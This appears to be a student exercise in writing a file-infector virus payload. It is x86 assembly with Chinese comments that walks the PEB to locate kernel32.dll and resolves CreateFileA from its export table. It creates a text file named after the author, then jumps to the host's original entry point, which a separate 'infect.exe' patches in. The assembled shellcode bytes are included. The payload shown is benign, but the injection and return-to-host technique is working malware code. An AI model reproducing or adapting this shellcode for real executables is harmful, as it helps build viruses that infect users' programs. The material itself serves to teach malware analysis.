; 查找kernel32.dll
xor ecx, ecx
mov eax, fs:[ecx + 0x30]	; EAX = PEB,

mov eax, [eax + 0xc]	; EAX=PEB->Ldr
mov esi, [eax + 0x14]	; ESI=PEB->Ldr.InMemOrder

lodsd	;EAX = SecondModule
xchg eax, esi	; 交换eax和esi的内容，
lodsd			; EAX = thirdModule 即kernel32OrderLinks,注意这里存的是地址
mov ebx, [eax + 0x10]	;获得kernel32.dll的装载地址

; 解析kernel32.dll
mov edx, [ebx + 0x3c]	; EDX = Dos->e_lfanew，即获得pEHeader的偏移
add edx, ebx 			; EDX = PE Header
mov edx, [edx + 0x78]	; edx中的的即是函数引出表的地址
add edx, ebx			; 依然RVA转VA
mov esi, [edx + 0x20]	; esi 为AddressOfNames的RVA
add esi, ebx			; 加上dll的基址获得VA

xor ecx, ecx			; 将ecx置0
GetFun:
	inc ecx;	; 记录函数的在表中的索引
	lodsd		; eax 中存着取得的函数名的RVA
	add eax, ebx	; 转RVA为VA
	cmp dword ptr[eax], 0x61657243;			; Crea
	jnz GetFun
	cmp dword ptr[eax + 0x4], 0x69466574	; teFi
	jnz GetFun
	cmp dword ptr[eax + 0x8], 0x41656c		; leA
	jnz GetFun
	
; 找到了函数，此时ecx存着序号，可以通过这个找到函数的实际地址
mov esi, [edx + 0x24]	; 此时esi存放 addressofNameOrdinary表起始RVA
add esi, ebx	; RVA转VA
mov cx, [esi + ecx * 2]	; cx = number of function
dec cx
mov esi, [edx + 0x1c]	 ; addressOfFunction ,
add esi, ebx			 ; RVA转VA
mov edx, [esi + ecx * 4] ; EDX即目标函数地址
add edx, ebx 			 ; RVA转VA

; 已经得到了目标函数地址，准备调用函数
;
;hFile=CreateFile(
;        			"C:\\test.txt",//创建或打开的文件或设备的名称(这里是txt文件)。
; 0x40000000  		GENERIC_WRITE,// 文件访问权限,写	0x40000000
;        		0	,//共享模式,这里设置0防止其他进程打开文件或设备
;        			NULL,//SECURITY_ATTRIBUTES结构，安全描述，这里NULL代表默认安全级别
;   2     			CREATE_ALWAYS,//对于存在或不存在的设置执行的操作，这里是始终创建
;   0x00000080    	FILE_ATTRIBUTE_NORMAL,//设置文件的属性，里面有高速缓存的选项
;   0    			NULL);

; 准备参数
xor ecx, ecx
add ecx, 0x747874
push ecx			; txt\0		1
push 0x2e6e6169		; ian.		2
push 0x74696557		; Weit		3
push 0x694c2d32		; 2-Li		4
push 0x32313038		; 8012		5
push 0x31323033		; 3021		6
push 0x39313032		; 2019		7

xor ecx, ecx		
push ecx	
push ecx		; NULL	 -8		8
push 0x00000080 ; 6参	 -0xc	9
add ecx, 2
push ecx		; 5参	 -0x10	10
xor ecx, ecx	; ecx继续置0
push ecx		; 4参	 0x14	11
push ecx		; 3参	 0x18	12
push 0x40000000 ; 2参	 0x1c	13
mov ecx, esp	; ecx中存入esp的值
add ecx, 0x1c	; 此时ecx存放了文件名的在栈中的偏移值
push ecx 		; 将此时的ecx当做1参	14

; 调用函数
call edx		; 调用CreateFileA
add esp, 0x20	; 清理堆栈
; 至此病毒载荷完成，接下来跳回原本的入口
xor ecx, ecx
mov eax, fs:[ecx + 0x30]	; EAX = PEB,

mov eax, [eax + 0xc]	; EAX=PEB->Ldr
mov esi, [eax + 0x14]	; ESI=PEB->Ldr.InMemOrder
;获得程序装载的imagebase
mov eax, [esi + 0x10]	; 获得装载地址
add eax, 0xAA88AAFF		; infect.exe会将0xAA88AAFF改成addressofentrypoint
jmp eax
	
	
	
unsigned char ida_chars[] =
{
  0x33, 0xC9, 0x64, 0x8B, 0x41, 0x30, 0x8B, 0x40, 0x0C, 0x8B, 
  0x70, 0x14, 0xAD, 0x96, 0xAD, 0x8B, 0x58, 0x10, 0x8B, 0x53, 
  0x3C, 0x03, 0xD3, 0x8B, 0x52, 0x78, 0x03, 0xD3, 0x8B, 0x72, 
  0x20, 0x03, 0xF3, 0x33, 0xC9, 0x41, 0xAD, 0x03, 0xC3, 0x81, 
  0x38, 0x43, 0x72, 0x65, 0x61, 0x75, 0xF4, 0x81, 0x78, 0x04, 
  0x74, 0x65, 0x46, 0x69, 0x75, 0xEB, 0x81, 0x78, 0x08, 0x6C, 
  0x65, 0x41, 0x00, 0x75, 0xE2, 0x8B, 0x72, 0x24, 0x03, 0xF3, 
  0x66, 0x8B, 0x0C, 0x4E, 0x66, 0x49, 0x8B, 0x72, 0x1C, 0x03, 
  0xF3, 0x8B, 0x14, 0x8E, 0x03, 0xD3, 0x33, 0xC9, 0x81, 0xC1, 
  0x74, 0x78, 0x74, 0x00, 0x51, 0x68, 0x69, 0x61, 0x6E, 0x2E, 
  0x68, 0x57, 0x65, 0x69, 0x74, 0x68, 0x32, 0x2D, 0x4C, 0x69, 
  0x68, 0x38, 0x30, 0x31, 0x32, 0x68, 0x33, 0x30, 0x32, 0x31, 
  0x68, 0x32, 0x30, 0x31, 0x39, 0x33, 0xC9, 0x51, 0x51, 0x68, 
  0x80, 0x00, 0x00, 0x00, 0x83, 0xC1, 0x02, 0x51, 0x33, 0xC9, 
  0x51, 0x51, 0x68, 0x00, 0x00, 0x00, 0x40, 0x8B, 0xCC, 0x83, 
  0xC1, 0x1C, 0x51, 0xFF, 0xD2, 0x83, 0xC4, 0x20, 0x33, 0xC9, 
  0x64, 0x8B, 0x41, 0x30, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x14, 
  0x8B, 0x46, 0x10, 0x05, 0xFF, 0xAA, 0x88, 0xAA, 0xFF, 0xE1
};

; 最后的 FF E1是jmp eax的机器码